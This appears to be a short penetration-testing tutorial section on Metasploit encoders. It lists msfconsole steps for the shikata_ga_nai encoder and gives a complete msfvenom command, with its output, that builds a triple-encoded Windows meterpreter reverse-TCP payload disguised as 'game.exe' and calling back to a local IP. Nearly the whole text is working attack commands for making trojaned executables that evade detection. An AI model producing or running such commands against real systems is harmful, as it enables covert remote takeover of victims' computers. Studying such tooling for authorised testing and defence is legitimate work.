## Encoders

> [!NOTE] We use `encoders` for hash `payloads`

```bash
# =======================================================================================
# Step 1
msf > show encoders

# =======================================================================================
# Step 2
msf > search shikata_ga_nai

# =======================================================================================
# Step 3
msf > use ncoder/x86/shikata_ga_nai

# =======================================================================================
# Step 4
msf encoder(x86/shikata_ga_nai) > show options # NOTE: It's don't has any options
```

> [!WARNING] We have another way to use this module

```bash
# =======================================================================================
# Step 1
msf encoder(x86/shikata_ga_nai) > exit

# =======================================================================================
# Step 2
# Tool  | Payload                           | Encoders            | Options
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 3 LHOST=192.168.0.108 LPORT=4444 -f exe -o game.exe
# [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
# [-] No arch selected, selecting arch: x86 from the payload
# Found 1 compatible encoders
# Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 382 (iteration=0)
# x86/shikata_ga_nai succeeded with size 409 (iteration=1)
# x86/shikata_ga_nai succeeded with size 436 (iteration=2)
# x86/shikata_ga_nai chosen with final size 436
# Payload size: 436 bytes
# Final size of exe file: 7680 bytes
# Saved as: game.exe

# =======================================================================================
# Step 3
ls game.exe
# game.exe
```

---
